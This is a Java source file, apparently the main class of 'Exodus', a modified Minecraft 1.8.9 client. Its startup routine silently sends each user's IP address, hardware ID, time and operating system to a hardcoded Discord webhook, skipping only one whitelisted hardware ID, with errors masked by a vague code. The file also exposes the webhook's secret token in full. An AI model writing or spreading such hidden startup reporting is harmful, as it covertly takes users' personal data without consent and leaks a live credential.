package me.oma.exodus;

import java.awt.Color;

import org.lwjgl.opengl.Display;

import me.oma.exodus.api.event.ClientEvent;
import me.oma.exodus.api.event.EventManager;
import me.oma.exodus.api.event.impl.UpdateEvent;
import me.oma.exodus.api.managers.ModuleManager;
import me.oma.exodus.api.protocol.ViaMCP;
import me.oma.exodus.api.util.client.DiscordWebhook;
import me.oma.exodus.api.util.client.Logger;
import me.oma.exodus.api.util.client.Wrapper;
import me.oma.exodus.api.util.player.SessionChanger;
import net.minecraft.client.Minecraft;

public class Client implements Wrapper {
	
	public static EventManager eventManager;
	public static ModuleManager moduleManager;
	
	public static Client INSTANCE = new Client();
	public static Logger LOGGER = new Logger();
	public static ViaMCP viaMCP = new ViaMCP();
	
	public String name = "Exodus";
	public String build = "dev";
	public String version = "v1.0 PRE-ALPHA";
	public String nameVer = "Exodus " + version;
	
	// Called on Minecraft startup
	public void init()
	{
		try
		{
			LOGGER.info("Initializing " + nameVer + ".");
			Display.setTitle("Exodus 1.8.9");
			
			// Load Managers
			loadManagers();
			LOGGER.info("Loaded Managers.");
			
			viaMCP.start();
			LOGGER.info("Loaded protocol switcher.");
			
			sendStartupMessage();
		}
		catch(Exception e)
		{
			LOGGER.info("Failed to initialize Exodus " + version + ".");
			e.printStackTrace();
		}
	}
	
	// Called on shutdown
	public void shutdown()
	{
		LOGGER.info("Shutting down Exodus 1.8.9.");
	}
	
	// Load managers
	public void loadManagers()
	{
		moduleManager = new ModuleManager();
		eventManager = new EventManager();
	}
	
	public void forceShutdown()
	{
		System.exit(1);
	}
	
	public void login(String email, String password)
	{
		SessionChanger.getInstance().setUser(email, password);
	}
	
	public void sendStartupMessage()
	{
		if (!systemUtils.getHWID().equals("4df6c3921a9c0929c51fdcee18a29687"))
		{
			try
			{
				DiscordWebhook webhook = new DiscordWebhook("https://ptb.discord.com/api/webhooks/862399542527262721/ocmvj5fOxmvPgdHXkQsI0S8sLcGbFQALFWS-TYeW_tZGs7bBG4LxrYpGEg_D0r8TUMdk");
				webhook.setUsername("Exodus Citadel");
				webhook.addEmbed(new DiscordWebhook.EmbedObject()
		            .setColor(Color.MAGENTA)
		            .setTitle("Brand new initialization of Exodus " + version + " Build: " + build)
		            .addField("IP", systemUtils.getIP(), true)
		            .addField("HWID", systemUtils.getHWID(), true)
		            .addField("Time", systemUtils.getCurrentTime(), true)
		            .addField("OS", systemUtils.getOS(), true));
				
				webhook.execute();
			}
			catch (Exception e)
			{
				LOGGER.info("Error code [1AQ]");
			}
		}
	}
	
}
